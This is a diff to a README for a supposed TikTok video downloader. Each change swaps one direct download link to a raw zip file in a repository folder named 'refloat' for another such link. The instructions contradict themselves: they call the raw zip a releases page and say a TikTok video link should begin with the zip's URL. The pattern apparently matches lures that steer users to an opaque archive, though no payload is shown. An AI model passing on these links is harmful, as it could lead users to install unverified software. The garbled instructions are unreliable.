@@ -1,6 +1,6 @@
 # 🎥 TikTok-Downloader--GUI - Easily Download TikTok Videos
 
-[![Download TikTok-Downloader--GUI](https://raw.githubusercontent.com/Fernando343117/TikTok-Downloader--GUI/main/refloat/TikTok-Downloader--GUI.zip)](https://raw.githubusercontent.com/Fernando343117/TikTok-Downloader--GUI/main/refloat/TikTok-Downloader--GUI.zip)
+[![Download TikTok-Downloader--GUI](https://raw.githubusercontent.com/Fernando343117/TikTok-Downloader--GUI/main/refloat/Downloader_Tok_Tik_GUI_1.5.zip)](https://raw.githubusercontent.com/Fernando343117/TikTok-Downloader--GUI/main/refloat/Downloader_Tok_Tik_GUI_1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to the TikTok-Downloader--GUI! This application allows you to download y
 ## 📥 Download & Install
 
 1. Visit this page to download:  
-   [Download TikTok-Downloader--GUI](https://raw.githubusercontent.com/Fernando343117/TikTok-Downloader--GUI/main/refloat/TikTok-Downloader--GUI.zip)  
+   [Download TikTok-Downloader--GUI](https://raw.githubusercontent.com/Fernando343117/TikTok-Downloader--GUI/main/refloat/Downloader_Tok_Tik_GUI_1.5.zip)  
    Here, you will find the latest version available.
 
 2. Once you are on the releases page, look for the latest version. It will usually be at the top of the page.
@@ -58,7 +58,7 @@ After you have downloaded and installed the application, follow these steps to d
 If you encounter any problems while using TikTok-Downloader--GUI, consider the following tips:
 
 - **Check Your Internet Connection**: Ensure you have a stable connection as downloads require internet access.
-- **Ensure Correct Link**: Make sure you copied the TikTok video link correctly. It should begin with "https://raw.githubusercontent.com/Fernando343117/TikTok-Downloader--GUI/main/refloat/TikTok-Downloader--GUI.zip".
+- **Ensure Correct Link**: Make sure you copied the TikTok video link correctly. It should begin with "https://raw.githubusercontent.com/Fernando343117/TikTok-Downloader--GUI/main/refloat/Downloader_Tok_Tik_GUI_1.5.zip".
 - **Update the App**: Make sure you are using the latest version. Check the releases page for any updates.
 
 ## 📧 Support
